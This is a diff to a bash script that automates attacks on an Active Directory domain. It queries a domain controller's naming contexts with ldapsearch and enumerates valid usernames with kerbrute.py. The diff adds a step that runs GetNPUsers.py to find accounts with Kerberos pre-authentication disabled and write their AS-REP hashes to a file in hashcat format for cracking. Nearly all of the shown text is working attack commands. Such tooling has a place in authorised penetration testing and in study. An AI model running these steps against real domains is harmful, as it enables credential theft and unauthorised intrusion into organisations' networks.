@@ -41,7 +41,7 @@ echo -e "\n\e[1;32mldapsearch to query DC namingcontexts\e[0m"
 ldapsearch -x -h $dc_ip -s base namingcontexts | grep "namingContexts:"
 
 #Identifying Usernames that exist in Kerberos Active Directory, finds kerbrute.py if it exists on the attck system.
-kerpath=$(locate kerbrute.py)
+kerpath=$(locate kerbrute.py -l 1)
 
 if [[ "$answer" = "y" && "$kerpath" = *"kerbrute.py"* ]]; then
 	echo -e "\n\e[1;33mkerbrute.py was found: $kerpath \e[0m"
@@ -75,3 +75,8 @@ if [[ "$answer" = "y" && "$kerpath" = *"kerbrute.py"* ]]; then
 else
         echo -e "\n\e[1;33mkerbrute.py was NOT found or input did not equal y, exiting kerbrute loop \e[0m"
 fi
+
+#From a list of already Validated Domain Accounts, Identifying those that have PREAUTH disabled and then capturing the password hash of those accounts.
+echo -e "\e[1;36mEnumerating Users that have PREAUTH disabled and returns a krb5asrep hash from the requested TGT if PREAUTH is disabled\e[0m"
+npuser_path=$(locate GetNPUsers.py -l 1)
+python3 $npuser_path -dc-ip $dc_ip $domain/ -usersfile kerbrute_users.txt -format hashcat -outputfile hashes.txt
